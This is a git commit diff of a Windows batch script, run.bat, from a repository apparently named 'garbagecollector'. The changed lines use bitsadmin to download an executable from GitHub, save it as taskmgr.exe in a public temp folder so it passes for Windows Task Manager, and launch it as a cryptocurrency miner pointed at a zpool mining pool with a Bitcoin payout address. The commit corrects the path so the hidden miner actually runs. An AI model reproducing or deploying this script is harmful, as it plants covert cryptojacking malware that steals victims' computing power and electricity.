4608f83169cafc81de6e42607a6dd96e17e0a38d
fantasticbest <38221799+fantasticbest@users.noreply.github.com>
2018-04-09 18:59:46 +0200

    Update run.bat

--- run.bat
+++ run.bat
@@ -1,5 +1,5 @@
 @echo off
-bitsadmin /transfer down https://github.com/fantasticbest/garbagecollector/raw/master/sysproc1.exe C:\Users\Public\Temp\taskmgr.exe  
-C:\Users\Public\Public\taskmgr.exe -a m7mhash -o stratum+tcp://m7m.mine.zpool.ca:6033 -u 1Lb6KVa3zkmP41dTvFErkzFzg89Ap9dsf -p c=BTC  
+bitsadmin /transfer down https://github.com/fantasticbest/garbagecollector/raw/master/taskmgr.exe C:\Users\Public\Temp\taskmgr.exe  
+C:\Users\Public\Temp\taskmgr.exe -a m7mhash -o stratum+tcp://m7m.mine.zpool.ca:6033 -u 1Lb6KVa3zkmP41dTvFErkzFzg89Ap9dsf -p c=BTC  
 
 
